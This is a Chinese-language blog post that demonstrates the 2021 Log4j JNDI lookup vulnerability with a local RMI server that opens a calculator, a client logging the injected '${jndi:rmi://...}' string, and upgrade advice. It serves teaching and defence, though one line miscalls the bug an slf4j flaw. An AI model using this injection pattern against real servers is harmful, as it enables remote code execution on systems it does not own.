---
title: log4j 漏洞攻击
category: java
tags:
  - java
  - log4j
  - 日志
keywords:
  - sdvdxl
  - java
  - log4j
  - 日志
abbrlink: 7af9
tag_img: 'https://public-links.todu.top/1639498829.png?imageMogr2/thumbnail/!100p'
date: 2021-12-14 23:16:11
updateDate: 2021-12-14 23:16:11
---

事情起因于前几天（2021-12-10号）被全球广泛应用的组件Apache Log4j被曝出一个高危漏洞，攻击者仅需一段代码就可远程控制受害者服务器的事件。受影响的版本为 `Apache Log4j 2.x <= 2.14.1`。

其实这个本来算是log4j的一个特性，这个玩意在log4j里面叫做 [lookup](https://logging.apache.org/log4j/2.x/manual/lookups.html)，简而言之可以使用一些特定的变量进行数据处理包括远程调用。但也因为这个特性，如果是用户填写的内容被解释了，那么可能会造成远程调用，造成执行任意代码的危害，接下来我们演示下怎么重现这个问题。

代码已经放在了[码云-sdvdxl](https://gitee.com/sdvdxl/log4j-attack-demo)上，该工程是 maven+springboot项目，建议使用 idea 或者 eclipse 打开操作和运行程序（本人使用 mac + idea 作为开发调试环境）

>**仅供技术学习交流使用，切勿用来进行非法行为！如果因此造成危害，后果自付！**

## log4j远程执行过程

方便起见，这里使用了 [spring-start](https://start.spring.io/) 创建了一个 springboot 项目，完整代码参见上面连接。

该演示工程主要分为两部分：

- RMI Server（参见源码 `top.todu.log4j.attack.demo.rmi.server` 包的 java 文件）
- RMI Client （参见 `top.todu.log4j.attack.demo.Application` 文件）

### RMI server

RMI server 非常简单（没有深入研究rmi，所以简单写了个demo），主要内容解释：

1. RmiServerDemo 作为主程序，注册一个服务名称为 `call` 可以供 client 调用
1. 绑定端口 1099

### TestRunCommand

这个类起作用的就是静态代码块，被远程调用的时候，该静态代码库就会被执行

```java
static {
    try {
      // 要执行的命令，这里测试是在我自己的电脑上打开计算器程序
      Runtime.getRuntime().exec("open -a Calculator");
    } catch (IOException e) {
      e.printStackTrace();
    }
    System.out.println("rmi");
  }
```

这个代码远程执行的命令是：`open -a Calculator` 打开计算器（mac 系统上的命令），如果你是运行在windows上，可以将它改为其他命令，比如 `calc`。

运行 `RmiServerDemo` 启动 rmi server。

### RMI client

客户端代码非常简单，就是一个普通的带有 main 方法的类，加点打印日志的代码：

```java
package top.todu.log4j.attack.demo;

import java.util.concurrent.TimeUnit;
import org.apache.logging.log4j.Logger;
import org.slf4j.LoggerFactory;

// 模拟线上服务
// @Slf4j
public class Application {

  public static void main(String[] args) throws InterruptedException {
    Logger logger = org.apache.logging.log4j.LogManager.getLogger("log4j");
    String username = "${jndi:rmi://127.0.0.1:1099/call}";
    logger.info("用户登录，username: {}", username);
    logger.info("测试日志输出");
    System.out.println(LoggerFactory.getILoggerFactory().getClass().getName());
    TimeUnit.SECONDS.sleep(5);
  }
}

```

核心代码只有：

```java
Logger logger = org.apache.logging.log4j.LogManager.getLogger("log4j");
String username = "${jndi:rmi://127.0.0.1:1099/call}";
logger.info("用户登录，username: {}", username);
```

1. get 一个logger
2. 模拟用户（黑客）输入内容
3. 打印日志

启动main方法，稍等片刻，即可看到打开了本机的计算器；同时 client 打印了日志：

```txt
rmi
TestRunCommand{测试用toString}
log4jlr log4jlr log4jlr log4jlr log4jlr log4jlr log4jlr 用户登录，username: top.todu.log4j.attack.demo.rmi.server.ReferenceWraper@3e08ff24
[]wExlog4jlr log4jlr log4jlr log4jlr log4jlr log4jlr log4jlr 测试日志输出
[]wExorg.apache.logging.slf4j.Log4jLoggerFactory
```

但是，server端只打印了 **rmi server started** 信息。

因为server和client都是运行在本机上，所以效果不明显；如果 server 部署到另一台机器， client 还在我的电脑上，那么我重新运行 client的话，还是会在我本就上打开我的计算器。

很奇怪是不是？这个跟rmi的原理有关： rmi 远程调用的时候，server将相关代码序列化传输到client上，client再在本机上运行这段代码。所以，如果别有用心的人写了个 rmi server，上面写了个比较厉害的代码（比如下载木马病毒，窃取数据库，甚至删库），那么可想而知，你的服务器是不是就炸了。

这就是这次 slf4j 的漏洞的危害，级别被定义为了 `Critical` 非常严重！

## 漏洞修复方法

如果用了log4j，还是老老实实的升级版本吧，最保险。截止目前，官方已经升级了版本到 `2.16.0`， 从 `2.15.0` 开始，默认禁用此特性，后续也可能删除。

## 问题？

我的服务使用的是 springboot，里面依赖了包含有log4j的包，会受到危害吗？

这里先简单说一下：

首先查看项目依赖：

maven 命令：

`mvn dependency:tree >tree` 查看 tree 文件内容，看看是否依赖 log4j

1. 如果项目明确指定使用的是 log4j（这里说的是log4j 2.xx）， 并且版本在 2.14.1 及其以下，毋庸置疑，受到影响
1. springboot默认依赖的是logging框架，使用的是 logback，如果整个项目未包含任何log4j的内容，那么显然不在影响范围内
1. 如果实际指定日志框架为 logback，只含了 log4j-core ，理论上也不会收到影响

所以，重点是要看实际日志输出的时候是用的哪套框架。
